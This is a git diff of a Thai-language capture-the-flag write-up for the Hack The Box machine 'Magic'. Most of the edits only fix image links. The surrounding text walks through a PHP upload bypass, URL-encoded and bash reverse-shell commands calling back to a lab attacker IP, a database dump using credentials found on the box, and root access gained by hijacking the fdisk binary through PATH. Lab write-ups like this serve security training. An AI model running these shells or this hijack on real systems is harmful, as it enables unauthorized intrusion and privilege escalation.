@@ -32,10 +32,10 @@ Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
 ```
 
 
-![[Challenge/HTB Challenge/Magic/IMG/001.png]]
+![](./IMG/001.png)
 
 upload.php
-![[Challenge/HTB Challenge/Magic/IMG/002.png]]
+![](./IMG/002.png)
 
 
 ## Bypass upload 
@@ -44,10 +44,10 @@ upload.php
 
 ทั้งนี้ เราสามารถใช้ cat.php.jpg ไปได้ โดยทำการเพิ่ม payload ของ php แทรกไประหว่างไฟล์
 
-![[Challenge/HTB Challenge/Magic/IMG/003.png]]
+![](./IMG/003.png)
 
 ทั้งนี้ จากการตรวจสอบหน้า index.php เราจะเห็นว่าระบบจะมีการเก็บไฟล์ไว้ที่ /images/uploads/ชื่อไฟล์ ทำให้เราสามารถทราบได้ว่าปลายทางที่เก็บอยู่ที่ใด 
-![[Challenge/HTB Challenge/Magic/IMG/004.png]]
+![](./IMG/004.png)
 
 ## Shell as www-data
 
@@ -56,19 +56,19 @@ upload.php
 http://10.10.10.185/images/uploads/cat2.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.34/443%200%3E%261%27
 ```
 
-![[Challenge/HTB Challenge/Magic/IMG/005.png]]
+![](./IMG/005.png)
 
 ## Enum host 
 
 เนื่องจากว่าเป้าหมายเป้นเว็บไซต์จึงเข้าไปตรวจสอบบนไฟล์ /var/www/Magic จะพบ config ไฟล์ของ db.php5 ทำให้เป็นข้อมูลของชื่อผู้ใช้งานและรหัสผ่าน สำหรับเข้าใช้งาน mysql 
 
-![[Challenge/HTB Challenge/Magic/IMG/006.png]]
+![](./IMG/006.png)
 
 ```bash
 mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
 ```
 
-![[Challenge/HTB Challenge/Magic/IMG/007.png]]
+![](./IMG/007.png)
 
 ## Shell as theseus 
 จะพบรหัสผ่านของ admin ซึ่งหากเราลอง su จะสามารถเข้าใช้งานได้ 
@@ -106,8 +106,7 @@ ltrace sysinfo
 
 จากการรันเราจะพบว่าโปรแกรม sysinfo มีการเรียกใช้งาน fdisk ด้วยซึ่งคาดว่าจะมีการรันด้วยสิทธิ ROOT  
 
-![[Challenge/HTB Challenge/Magic/IMG/008.png]]
-
+![](./IMG/008.png)
 
 โดยคำสั่ง popen เป็นการเปิดใช้งาน Process บน Linux ซึ่งจากบรรทัดดังกล่าวเป็นการเรียกใช้ fidisk ซึ่งหากไม่มีการระบุ full path นั่นหมายความว่าเราก็สามารถ Hijack Binary ได้เช่นกัน 
 
@@ -116,20 +115,14 @@ ltrace sysinfo
 theseus@magic:~$ cd /dev/shm
 cd /dev/shm
 
-theseus@magic:/dev/shm$ echo -e '#!/bin/bash
+theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
 
-bash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
-
-</bash
-
-bash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
+</bash\n\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' 
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.34/443 0>&1
 
-theseus@magic:/dev/shm$ echo -e '#!/bin/bash
-
-bash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
+theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
 
 
 <nbash -i >& /dev/tcp/10.10.14.34/444 0>&1'  > fdisk
@@ -148,11 +141,9 @@ theseus@magic:/dev/shm$ sysinfo
 
 ```
 
-
 และฝั่งผู้โจมตีการรอรับ  reverse shell ก็จะได้สิทธ้ root 
 
-![[Challenge/HTB Challenge/Magic/IMG/009.png]]
+![](./IMG/009.png)
 
 
 # PWNED
-```
